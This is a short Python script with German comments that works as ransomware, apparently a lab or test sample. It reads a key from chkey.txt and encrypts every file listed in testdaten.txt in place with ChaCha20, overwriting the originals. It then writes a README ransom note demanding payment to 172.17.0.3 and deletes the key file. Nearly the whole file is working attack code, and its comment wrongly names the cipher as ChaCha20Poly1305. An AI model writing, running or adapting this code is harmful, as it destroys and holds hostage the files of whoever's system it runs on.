import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.backends import default_backend
import platform
import socket


def encrypt_file_chacha20(key, input_file, output_file):
    # Generiere einen zufälligen Nonce
    nonce = os.urandom(16)

    # Erstellen einer ChaCha20Poly1305-Verschlüsselungsinstanz mit dem Schlüssel und Nonce
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend()).encryptor()

    # Lesen des Inhalts der Eingabedatei
    with open(input_file, 'rb') as file:
        plaintext = file.read()

    # Verschlüsseln der Daten
    ciphertext = cipher.update(plaintext) + cipher.finalize()

    # Schreiben von Nonce und verschlüsselten Daten in die Ausgabedatei
    with open(output_file, 'wb') as file:
        file.write(nonce + ciphertext)




with open("chkey.txt","rb") as keyfile:

	key =  keyfile.read()



with open("testdaten.txt", "r") as file:
    for line in file:
        line = line.rstrip("\n")
        encrypt_file_chacha20(key, line, line)


readme = open("README","w")
readme.write("Your System has been encrypted, please send a file called 'payment' with 1€ to 172.17.0.3 : pw: root in order to receive the decryption key")
os.remove("/chkey.txt")
